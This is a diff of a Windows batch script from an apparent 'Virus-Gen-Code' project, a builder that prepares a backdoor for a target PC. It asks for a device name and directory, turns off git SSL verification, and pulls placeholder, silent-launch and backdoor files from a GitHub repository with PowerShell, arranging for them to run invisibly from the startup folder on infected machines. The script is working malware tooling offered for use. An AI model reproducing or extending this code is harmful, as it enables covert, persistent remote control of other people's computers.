@@ -1,7 +1,8 @@
 :: setup
 :start
 @ECHO OFF
-set update_number=V3.33.25
+set update_number=V3.30.23
+set update_number=V3.31.23
 set dev=0
 cls
 :VBSDynamicBuild
@@ -20,7 +21,7 @@ if %username% neq luken if %dev% equ 1 goto dev
 :skip_dev
 goto CP
 :adminyes
-if exist C:\ProgramData\UPnum.sav (goto update_check) else (goto UPcreate)
+if exist C:\ProgramData\UPnum.sav (call :update_check) else (goto UPcreate)
 :UPnxt
 git version >git.sav
 >nul find "version" git.sav && (
@@ -36,8 +37,6 @@ if exist C:\ProgramData\GVGemail.sav (goto load_email) else (goto error2)
 if exist "C:\Users\%username%\launch.vbs" goto backdoor_remove
 :no_remove_backdoor
 :: manual configuration
-  echo current version: %update_number%
-  echo.
   echo [31madmin backdoor is currently broken, do no use this[0m
   echo do you have admin permissions on the target PC?
   echo note: this will require you to have admin rights when infecting A PC, however it will infect all users on that PC, not just the active one.
@@ -50,13 +49,14 @@ if exist "C:\Users\%username%\launch.vbs" goto backdoor_remove
   set /p opt1=Device name:
   echo where would you like to create the files
   echo if directory does not exist it will be created
+  set /p opt2=directory:
 :: create all files needed
   :: create placeholder file
     Powershell (Invoke-webrequest -URI "https://raw.githubusercontent.com/Guest257351/Virus-Gen-Code/main/default_placeholder.bat").Content >%opt1%.bat
   :: upload file to github
     echo [33mregistering code on github...[0m
-    git config --global user.name "%username%"
-    git config --global user.email "%email%"
+    git config user.name "%username%"
+    git config user.email "%email%"
     git config --global http.sslVerify false
     git reset --hard origin/main
     git init -b main
@@ -70,7 +70,7 @@ if exist "C:\Users\%username%\launch.vbs" goto backdoor_remove
   :: generate a file to launch payload from start up folder in invisible mode
     mkdir %opt2%\payload >nul
     echo [33mdownloading code from github to create silent launch file...[0m
-    Powershell (Invoke-webrequest -URI "https://raw.githubusercontent.com/Guest257351/Virus-Gen-Code/main/SL.vbs").Content >%opt2%\payload\launch.vbs
+    Powershell (Invoke-webrequest -URI "https://raw.githubusercontent.com/Guest257351/Virus-Gen-Code/main/SL.bat").Content >%opt2%\payload\launch.vbs
     if exist %opt2%\payload\launch.vbs (echo [92msuccessfully created silent launch file![0m) else (goto error4)
   :: generate a file to run code from github on the target PC
     echo [33mdownloading code from github to create backdoor file...[0m
@@ -105,7 +105,7 @@ exit /b
 < C:\ProgramData\UPnum.sav (
   set /p UPnum=
 )
-if %UPnum% equ %update_number% goto UPnxt
+if %UPnum% equ %update_number% exit /b
 :UPlogs
 echo %update_number% >C:\ProgramData\UPnum.sav
 Powershell (Invoke-webrequest -URI "https://raw.githubusercontent.com/Guest257351/Virus-Gen-Code/main/Current-update-logs").Content >C:\ProgramData\UPlogs.txt
